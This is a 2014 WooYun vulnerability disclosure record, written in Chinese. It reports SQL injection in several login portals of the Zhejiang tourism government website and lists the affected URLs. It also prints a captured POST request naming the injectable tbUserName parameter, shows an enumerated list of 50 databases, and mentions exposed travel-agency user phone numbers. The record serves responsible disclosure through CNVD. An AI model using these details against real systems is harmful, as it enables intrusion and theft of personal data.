{"id": 54739, "wybug_id": "wooyun-2014-063489", "wybug_title": "某旅游网综合性应用平台存在SQL注射(影响省内多数旅游社)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "魇", "wybug_date": "2014-06-04 18:16", "wybug_open_date": "2014-09-02 18:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-02：\t细节向公众公开  简要描述： 旅行管理系统各种敏感信息，走前台吧? 详细说明：  \nwww.tourzj.gov.cn/ 浙江旅游网浙江旅游网是一个基于网络服务，使用各项先进技术，整合浙江旅游资源，以旅游者需求为中心，提供各种旅游相关信息和服务，集旅游业行业综合管理、公众信息服务、电子商务交易和远程办公于一体的大型综合性应用平台。浙江旅游网将为众多信息提供商及服务提供商提供集成、创造商机、提高效益。该系统还包括旅行社管理系统、住宿企业管理系统、景区管理系统等多旅游行业管理子系统，分别集成了企业内部信息化管理系统、行业管理系统、信息发布系统等模块，通用于所有同类企业。建成后的浙江旅游网将成为我省旅游信息的网上枢纽站，为促进浙江旅游，进一步带动地区的经济发展发挥积极的作用。\n\n\n这套系统应该是由浙江省旅游信息中心开发，虽然有的登录界面稍有不同，但是从响应的提示可以看出是同源的，应该是配置不当吧，有几个不存在注入，但是多数管理平台存在注入。影响案例：\nhttp://item.tourzj.gov.cn/invest/login.aspx 浙江省旅游投资商查询系统http://item.tourzj.gov.cn/touristSites/login.aspx 浙江旅游景区管理平台http://stat.tourzj.gov.cn/login.aspx 浙江旅游统计系统 http://item.tourzj.gov.cn/GeneralSubject/Login.aspx  浙江省旅游信息中心通用专题后台http://item.tourzj.gov.cn/leader/leaderadmin/login.aspx  浙江省领队年审培训系统http://item.tourzj.gov.cn/projectitem/Travel/Travel/TravelLogin.aspx 浙江省旅行社业务管理系统http://item.tourzj.gov.cn/projectitem/Travel/Tourism/TourismLogin.aspx  浙江省旅行社业务分支机构登录http://item.tourzj.gov.cn/hotel/admin/adminlogin.aspx 旅游饭店动态管理系统http://item.tourzj.gov.cn/projectitem/InfoReport/Default.aspx  用户登录 http://news.tourzj.gov.cn/admin/login.aspx  浙江旅游信息联播后台管理登陆\n浙江旅游景区管理\n\n浙江旅游信息联播后台管理\n\n浙江省旅行社业务管理系统\n\n   漏洞证明：  \n\n以http://item.tourzj.gov.cn/projectitem/Travel/Travel/TravelLogin.aspx 浙江省旅行社业务管理系统为例tbUserName参数存在注入，post包：\nPOST /projectitem/Travel/Travel/TravelLogin.aspx HTTP/1.1Host: item.tourzj.gov.cnProxy-Connection: keep-aliveContent-Length: 284Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://item.tourzj.gov.cnUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://item.tourzj.gov.cn/projectitem/Travel/Travel/TravelLogin.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8__VIEWSTATE=%2FwEPDwUKLTUzNDczNjI1MGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFDEltYWdlQnV0dG9uMTdrjRs3IQ4CzKolEZ9cFOtFhWJb&__EVENTVALIDATION=%2FwEWBAKumdPIDALyj%2FOQAgKg1t%2FLAQLSwpnTCFEZkzAWJhZ7Hj3DHanYhdqwn3W1&tbUserName=admin&tbpwd=admin&ImageButton1.x=47&ImageButton1.y=22\n\n\n速度太慢，不一一跑了，数据库：\navailable databases [50]:[*] 12301[*] [new12301\\x03][*] Assessment[*] bwh[*] car[*] ChangXing[*] Complaint[*] cw[*] DBTest[*] Financial[*] GlobalDataBase[*] GovAffair[*] Guide[*] HAReport[*] hjz[*] HotelManage[*] InfoPubSystem[*] InfoReported[*] ItemDynamic[*] lky[*] master[*] model[*] msdb[*] Survey_hz[*] Survey_zj[*] tempdb[*] TenHundredThouand[*] TourItemManagement[*] TourManage[*] tourzjcenterdb[*] travel[*] travelagencyty[*] TravelService[*] ts2009[*] ts2010[*] ts2011[*] ts2012[*] ts2013[*] ts2014[*] txl[*] vhostA[*] weboadb[*] WeiXin[*] wenzhoudb[*] wzdben[*] YQTourCenterDB[*] zjlypxw[*] zjlypxwbbs[*] zsweboadb[*] ZY_HeWheng\nhttp://item.tourzj.gov.cn/projectitem/Travel/Travel/TravelUserQuery.aspx 从这里也可以看到光这个管理系统就有N多旅行社,旅行社名称\t用户名\t真实姓名\t手机号码\t 下面还有，只截图了部分\n\n   修复方案：  联系浙江旅游网   版权声明：转载请注明来源 魇@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-06-08 22:11 厂商回复： CNVD确认并复现所述多个实例情况，根据测试实例情况，已经转由CNCERT下发给浙江分中心处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-04 18:19 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @xsser @疯狗 这个为什么走的小厂商呢?    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}